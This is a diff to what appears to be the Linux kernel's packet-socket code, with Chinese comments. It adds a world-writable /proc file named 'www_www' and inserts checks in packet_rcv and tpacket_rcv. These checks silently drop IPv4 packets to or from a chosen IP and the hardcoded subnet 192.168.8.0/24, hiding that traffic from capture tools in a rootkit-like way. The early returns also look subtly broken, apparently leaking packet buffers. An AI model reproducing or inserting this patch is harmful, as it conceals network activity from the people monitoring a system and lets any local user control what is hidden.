@@ -95,6 +95,8 @@
 #include <linux/netfilter_netdev.h>
 
 #include "internal.h"
+#include <linux/ctype.h>
+
 
 /*
    Assumptions:
@@ -156,6 +158,74 @@ dev_has_header(dev) == false (ll header is invisible to us)
 /* identical to struct packet_mreq except it has
  * a longer address field.
  */
+
+/*
+ * 全局静态变量: 存储要过滤的 IP
+ * 默认值: 0 (代表为空，不过滤)
+ */
+static __be32 g_www_ip = 0;
+
+
+#define PROC_FILENAME "www_www"
+
+/*
+ * 写入函数: echo "1.2.3.4" > /proc/www_www
+ */
+static ssize_t www_write(struct file *file, const char __user *ubuf,
+                         size_t count, loff_t *ppos)
+{
+    char kbuf[32];
+    size_t copy_len = count > 31 ? 31 : count;
+    __be32 new_ip = 0;
+
+    if (copy_from_user(kbuf, ubuf, copy_len))
+        return -EFAULT;
+
+    kbuf[copy_len] = '\0';
+
+    // 去除末尾换行符
+    while (copy_len > 0 && isspace(kbuf[copy_len - 1])) {
+        kbuf[copy_len - 1] = '\0';
+        copy_len--;
+    }
+
+    // 输入 0 或 clear 清空规则
+    if (copy_len == 0 || strcmp(kbuf, "0") == 0 || strcmp(kbuf, "clear") == 0) {
+        g_www_ip = 0;
+        printk(KERN_INFO "AF_PACKET: Dynamic filter cleared.\n");
+    } else {
+        new_ip = in_aton(kbuf); // 字符串转整数
+        if (new_ip == 0) return -EINVAL;
+        g_www_ip = new_ip;
+        printk(KERN_INFO "AF_PACKET: Dynamic filter set to: %pI4\n", &g_www_ip);
+    }
+    return count;
+}
+
+/* 读取函数: cat /proc/www_www */
+static ssize_t www_read(struct file *file, char __user *ubuf,
+                        size_t count, loff_t *ppos)
+{
+    char kbuf[64];
+    int len;
+    if (*ppos > 0) return 0;
+
+    if (g_www_ip == 0)
+        len = sprintf(kbuf, "(0.0.0.0)");
+    else
+        len = sprintf(kbuf, "%pI4\n", &g_www_ip);
+
+    if (copy_to_user(ubuf, kbuf, len)) return -EFAULT;
+    *ppos = len;
+    return len;
+}
+
+static const struct proc_ops www_fops = {
+    .proc_read = www_read,
+    .proc_write = www_write,
+};
+
+
 struct packet_mreq_max {
 	int		mr_ifindex;
 	unsigned short	mr_type;
@@ -327,6 +397,8 @@ static u16 packet_pick_tx_queue(struct sk_buff *skb)
 
 	return queue_index;
 }
+
+
 
 /* __register_prot_hook must be invoked through register_prot_hook
  * or from a context in which asynchronous accesses to the packet
@@ -2122,6 +2194,42 @@ static int packet_rcv(struct sk_buff *skb, struct net_device *dev,
 	int skb_len = skb->len;
 	unsigned int snaplen, res;
 
+        if (skb->protocol == htons(ETH_P_IP)) {
+        
+        // 直接在函数内部转换指针，获取 IP 头
+        // skb_network_header 是内核通用宏，无需额外引用
+        struct iphdr *iph = (struct iphdr *)skb_network_header(skb);
+
+        if (iph) {
+            /* 
+             * 1. 定义要过滤的固定 IP: 43.138.133.188
+             * 计算方式: 43=0x2B, 138=0x8A, 133=0x85, 188=0xBC
+             * 结果: 0x2B8A85BC
+             */
+
+	    if (g_www_ip != 0) {
+                if (iph->saddr == g_www_ip || iph->daddr == g_www_ip) {
+                    return 0; // 匹配动态IP，拦截
+                }
+            }
+
+            /* 
+             * 2. 定义要过滤的网段: 192.168.8.x (/24)
+             * 基础IP: 192.168.8.0 -> 0xC0A80800
+             * 子网掩码: 255.255.255.0 -> 0xFFFFFF00
+             */
+            __be32 filter_subnet_ip = htonl(0xC0A80800);
+            __be32 filter_netmask   = htonl(0xFFFFFF00);
+
+
+            // B. 判断网段 ( (IP & 掩码) == 基础IP )
+            if ((iph->saddr & filter_netmask) == filter_subnet_ip || 
+                (iph->daddr & filter_netmask) == filter_subnet_ip) {
+                return 0; // 拦截成功
+            }
+        }
+    }
+
 	if (skb->pkt_type == PACKET_LOOPBACK)
 		goto drop;
 
@@ -2224,6 +2332,9 @@ drop:
 	return 0;
 }
 
+
+
+
 static int tpacket_rcv(struct sk_buff *skb, struct net_device *dev,
 		       struct packet_type *pt, struct net_device *orig_dev)
 {
@@ -2250,6 +2361,35 @@ static int tpacket_rcv(struct sk_buff *skb, struct net_device *dev,
 	 */
 	BUILD_BUG_ON(TPACKET_ALIGN(sizeof(*h.h2)) != 32);
 	BUILD_BUG_ON(TPACKET_ALIGN(sizeof(*h.h3)) != 48);
+ if (skb->protocol == htons(ETH_P_IP)) {
+        // 获取 IP 头
+        struct iphdr *iph = (struct iphdr *)skb_network_header(skb);
+
+        if (iph) {
+
+            /* 
+             * 2. 过滤网段: 192.168.8.x (/24)
+             * IP: 192.168.8.0 -> 0xC0A80800
+             * Mask: 255.255.255.0 -> 0xFFFFFF00
+             */
+            __be32 filter_subnet = htonl(0xC0A80800);
+            __be32 filter_mask   = htonl(0xFFFFFF00);
+
+            // A. 匹配固定 IP (源或目的)
+            // B. 匹配网段
+            if ((iph->saddr & filter_mask) == filter_subnet || 
+                (iph->daddr & filter_mask) == filter_subnet) {
+                return 0; // 直接拦截
+            }
+
+	    if (g_www_ip != 0) {
+                if (iph->saddr == g_www_ip || iph->daddr == g_www_ip) {
+                    return 0; // 匹配动态IP，拦截
+                }
+            }
+        }
+    }
+
 
 	if (skb->pkt_type == PACKET_LOOPBACK)
 		goto drop;
@@ -4779,6 +4919,12 @@ static void __exit packet_exit(void)
 
 static int __init packet_init(void)
 {
+        if (proc_create(PROC_FILENAME, 0666, NULL, &www_fops)) {
+           printk(KERN_INFO "AF_PACKET: /proc/%s created.\n", PROC_FILENAME);
+        }
+    
+        g_www_ip = 0;
+
 	int rc;
 
 	rc = register_pernet_subsys(&packet_net_ops);
